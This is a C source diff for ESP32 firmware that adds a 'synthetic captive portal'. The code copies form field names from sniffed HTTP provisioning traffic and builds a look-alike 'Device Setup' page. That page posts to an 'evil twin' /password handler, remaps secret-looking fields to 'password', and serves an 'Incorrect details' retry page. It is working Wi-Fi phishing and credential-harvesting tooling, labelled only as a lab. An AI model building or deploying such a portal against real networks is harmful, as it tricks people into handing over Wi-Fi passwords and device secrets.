@@ -19,6 +19,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <strings.h>
 
 static const char *TAG = "ota_provision";
 
@@ -67,6 +68,14 @@ static int64_t s_start_ms;
 static uint8_t s_previous_channel = 1;
 static wifi_second_chan_t s_previous_secondary = WIFI_SECOND_CHAN_NONE;
 static portMUX_TYPE s_lock = portMUX_INITIALIZER_UNLOCKED;
+
+/* Synthetic captive portal built from field-name metadata only */
+static char *s_portal_html;
+static char *s_portal_wrong_html;
+static char s_portal_path[96];
+static char s_portal_method[8];
+static uint8_t s_portal_field_count;
+static char s_portal_fields[OTA_PROV_MAX_FIELDS][32];
 
 static const uint8_t *find_bytes(const uint8_t *data, size_t len,
                                  const char *needle, size_t needle_len)
@@ -613,8 +622,11 @@ const char *ota_provision_get_summary_json(void)
     portEXIT_CRITICAL(&s_lock);
     snprintf(buf, OTA_JSON_2K_SZ,
              "{\"capture\":\"http-provisioning\",\"retention\":\"bounded-psram\","
-             "\"portal_values\":\"not-retained\",\"packets_captured\":%u,"
+             "\"portal_values\":\"not-retained\",\"portal_ready\":%s,"
+             "\"portal_fields\":%u,\"packets_captured\":%u,"
              "\"packets_dropped\":%u,\"preview_count\":%u,\"pcap_bytes\":%u}",
+             s_portal_html ? "true" : "false",
+             (unsigned)s_portal_field_count,
              (unsigned)state.packets_captured, (unsigned)state.packets_dropped,
              (unsigned)state.preview_count, (unsigned)state.pcap_bytes);
     return buf;
@@ -635,4 +647,260 @@ void ota_provision_clear(void)
     portENTER_CRITICAL(&s_lock);
     reset_capture_locked();
     portEXIT_CRITICAL(&s_lock);
+    heap_psram_free(s_portal_html);
+    heap_psram_free(s_portal_wrong_html);
+    s_portal_html = NULL;
+    s_portal_wrong_html = NULL;
+    s_portal_path[0] = '\0';
+    s_portal_method[0] = '\0';
+    s_portal_field_count = 0;
+    memset(s_portal_fields, 0, sizeof(s_portal_fields));
+}
+
+/* ------------------------------------------------------------------ */
+/*  Synthetic captive portal from captured field names only            */
+/* ------------------------------------------------------------------ */
+
+static bool field_looks_secret(const char *name)
+{
+    static const char *keys[] = {
+        "password", "passwd", "pass", "pwd", "secret", "token",
+        "key", "pin", "passphrase", "wifi_pass", "wifipass",
+        "api_key", "apikey", NULL
+    };
+    if (!name || !name[0]) return false;
+    for (int i = 0; keys[i]; i++) {
+        if (strcasecmp(name, keys[i]) == 0) return true;
+    }
+    return false;
+}
+
+static bool portal_field_exists(const char *name)
+{
+    for (uint8_t i = 0; i < s_portal_field_count; i++) {
+        if (strcasecmp(s_portal_fields[i], name) == 0) return true;
+    }
+    return false;
+}
+
+static void portal_add_field(const char *name)
+{
+    if (!name || !name[0] || s_portal_field_count >= OTA_PROV_MAX_FIELDS) return;
+    if (portal_field_exists(name)) return;
+    strncpy(s_portal_fields[s_portal_field_count], name,
+            sizeof(s_portal_fields[0]) - 1);
+    s_portal_fields[s_portal_field_count][sizeof(s_portal_fields[0]) - 1] = '\0';
+    s_portal_field_count++;
+}
+
+static void collect_portal_metadata(void)
+{
+    prov_preview_t preview[OTA_PROV_MAX_PREVIEW];
+    uint32_t count;
+    portENTER_CRITICAL(&s_lock);
+    count = s_state.preview_count;
+    memcpy(preview, s_preview, count * sizeof(preview[0]));
+    portEXIT_CRITICAL(&s_lock);
+
+    s_portal_field_count = 0;
+    memset(s_portal_fields, 0, sizeof(s_portal_fields));
+    s_portal_path[0] = '\0';
+    s_portal_method[0] = '\0';
+
+    /* Prefer newest POST/PUT/PATCH with fields; else any with fields; else path. */
+    int best = -1;
+    for (int i = (int)count - 1; i >= 0; i--) {
+        bool write_m = (strcmp(preview[i].method, "POST") == 0 ||
+                        strcmp(preview[i].method, "PUT") == 0 ||
+                        strcmp(preview[i].method, "PATCH") == 0);
+        if (preview[i].field_count > 0 && write_m) {
+            best = i;
+            break;
+        }
+        if (best < 0 && preview[i].field_count > 0) best = i;
+        if (best < 0 && preview[i].path[0]) best = i;
+    }
+    if (best < 0) return;
+
+    strncpy(s_portal_path, preview[best].path, sizeof(s_portal_path) - 1);
+    strncpy(s_portal_method, preview[best].method, sizeof(s_portal_method) - 1);
+    for (uint8_t f = 0; f < preview[best].field_count; f++) {
+        portal_add_field(preview[best].fields[f]);
+    }
+    /* Merge unique fields from other previews (structure only). */
+    for (uint32_t i = 0; i < count; i++) {
+        for (uint8_t f = 0; f < preview[i].field_count; f++) {
+            portal_add_field(preview[i].fields[f]);
+        }
+    }
+}
+
+static int append_portal_inputs(char *buf, size_t buf_size, int pos, bool show_error)
+{
+    (void)show_error;
+    if (s_portal_field_count == 0) {
+        return snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
+            "<label>WiFi Password</label>"
+            "<input type='password' name='password' placeholder='Enter value' required autofocus>");
+    }
+
+    bool mapped_password = false;
+    for (uint8_t i = 0; i < s_portal_field_count; i++) {
+        const char *name = s_portal_fields[i];
+        bool secret = field_looks_secret(name);
+        const char *input_name = name;
+        /* Evil twin /password handler expects name=password for the secret. */
+        if (secret && !mapped_password) {
+            input_name = "password";
+            mapped_password = true;
+        }
+        const char *type = secret ? "password" : "text";
+        const char *autofocus = (i == 0) ? " autofocus" : "";
+        int n = snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
+            "<label>%s</label>"
+            "<input type='%s' name='%s' placeholder='%s' value='' required%s>",
+            name, type, input_name, name, autofocus);
+        if (n < 0) return -1;
+        pos += n;
+        if ((size_t)pos >= buf_size) return -1;
+    }
+    if (!mapped_password) {
+        /* Ensure at least one password= field for the evil twin handler. */
+        int n = snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
+            "<input type='hidden' name='password' value=''>");
+        if (n < 0) return -1;
+        pos += n;
+    }
+    return pos;
+}
+
+static esp_err_t render_portal_page(char **out_html, bool wrong_page)
+{
+    char *buf = heap_caps_malloc(OTA_PROV_PORTAL_HTML_MAX,
+                                 MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!buf) {
+        buf = heap_caps_malloc(OTA_PROV_PORTAL_HTML_MAX, MALLOC_CAP_8BIT);
+    }
+    if (!buf) return ESP_ERR_NO_MEM;
+
+    const char *title = "Device Setup";
+    const char *subtitle = s_portal_path[0]
+        ? s_portal_path
+        : "Complete setup to continue.";
+    const char *err_style = wrong_page ? "block" : "none";
+
+    int pos = snprintf(buf, OTA_PROV_PORTAL_HTML_MAX,
+        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
+        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<title>%s</title><style>"
+        "*{box-sizing:border-box;margin:0;padding:0}"
+        "body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;"
+        "justify-content:center;align-items:center;min-height:100vh}"
+        ".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);"
+        "padding:32px;width:min(400px,90vw)}"
+        "h2{color:#1a1a2e;margin-bottom:8px;font-size:22px}"
+        ".sub{color:#666;font-size:14px;margin-bottom:24px;word-break:break-all}"
+        "label{display:block;font-size:13px;font-weight:700;color:#333;margin-bottom:6px}"
+        "input{width:100%%;height:44px;border:1px solid #ddd;border-radius:8px;"
+        "padding:0 12px;font-size:15px;outline:none;margin-bottom:16px}"
+        "input:focus{border-color:#4a90d9;box-shadow:0 0 0 3px rgba(74,144,217,.15)}"
+        "button{width:100%%;height:46px;border:0;border-radius:8px;background:#4a90d9;"
+        "color:#fff;font-size:16px;font-weight:700;cursor:pointer}"
+        "button:hover{background:#3a7bc8}"
+        ".foot{margin-top:16px;text-align:center;color:#999;font-size:12px}"
+        ".err{color:#d32f2f;font-size:13px;margin-bottom:12px;padding:8px;"
+        "background:#fde8e8;border-radius:6px;display:%s}"
+        "</style></head><body><div class='card'>"
+        "<h2>%s</h2>"
+        "<p class='sub'>%s</p>"
+        "<div class='err' id='err'>Incorrect details. Please try again.</div>"
+        "<form method='POST' action='/password'>",
+        title, err_style, title, subtitle);
+    if (pos < 0 || (size_t)pos >= OTA_PROV_PORTAL_HTML_MAX) {
+        heap_psram_free(buf);
+        return ESP_ERR_NO_MEM;
+    }
+
+    int next = append_portal_inputs(buf, OTA_PROV_PORTAL_HTML_MAX, pos, wrong_page);
+    if (next < 0 || (size_t)next >= OTA_PROV_PORTAL_HTML_MAX) {
+        heap_psram_free(buf);
+        return ESP_ERR_NO_MEM;
+    }
+    pos = next;
+
+    int n = snprintf(buf + pos,
+                     OTA_PROV_PORTAL_HTML_MAX > (size_t)pos
+                         ? OTA_PROV_PORTAL_HTML_MAX - (size_t)pos : 0,
+        "<button type='submit'>Continue</button>"
+        "</form><div class='foot'>Provisioning portal (lab)</div>"
+        "</div></body></html>");
+    if (n < 0 || (size_t)(pos + n) >= OTA_PROV_PORTAL_HTML_MAX) {
+        heap_psram_free(buf);
+        return ESP_ERR_NO_MEM;
+    }
+
+    *out_html = buf;
+    return ESP_OK;
+}
+
+esp_err_t ota_provision_build_portal(void)
+{
+    collect_portal_metadata();
+    if (!s_portal_path[0] && s_portal_field_count == 0 &&
+        s_state.preview_count == 0 && s_state.packets_captured == 0) {
+        return ESP_ERR_NOT_FOUND;
+    }
+
+    char *index_html = NULL;
+    char *wrong_html = NULL;
+    esp_err_t err = render_portal_page(&index_html, false);
+    if (err != ESP_OK) return err;
+    err = render_portal_page(&wrong_html, true);
+    if (err != ESP_OK) {
+        heap_psram_free(index_html);
+        return err;
+    }
+
+    heap_psram_free(s_portal_html);
+    heap_psram_free(s_portal_wrong_html);
+    s_portal_html = index_html;
+    s_portal_wrong_html = wrong_html;
+
+    ESP_LOGI(TAG, "Built synthetic portal: path='%s' fields=%u (%u bytes)",
+             s_portal_path[0] ? s_portal_path : "/",
+             (unsigned)s_portal_field_count,
+             (unsigned)strlen(s_portal_html));
+    return ESP_OK;
+}
+
+bool ota_provision_has_portal(void)
+{
+    return s_portal_html != NULL && s_portal_html[0] != '\0';
+}
+
+const char *ota_provision_get_portal_html(void)
+{
+    return s_portal_html ? s_portal_html : "";
+}
+
+const char *ota_provision_get_portal_wrong_html(void)
+{
+    return s_portal_wrong_html ? s_portal_wrong_html : "";
+}
+
+cJSON *ota_provision_get_portal_meta_json(void)
+{
+    cJSON *root = cJSON_CreateObject();
+    if (!root) return NULL;
+    cJSON_AddBoolToObject(root, "ready", ota_provision_has_portal());
+    cJSON_AddBoolToObject(root, "values_retained", false);
+    cJSON_AddStringToObject(root, "path", s_portal_path[0] ? s_portal_path : "");
+    cJSON_AddStringToObject(root, "method", s_portal_method[0] ? s_portal_method : "");
+    cJSON_AddNumberToObject(root, "html_bytes",
+                            s_portal_html ? (double)strlen(s_portal_html) : 0);
+    cJSON *fields = cJSON_AddArrayToObject(root, "fields");
+    for (uint8_t i = 0; fields && i < s_portal_field_count; i++) {
+        cJSON_AddItemToArray(fields, cJSON_CreateString(s_portal_fields[i]));
+    }
+    return root;
 }
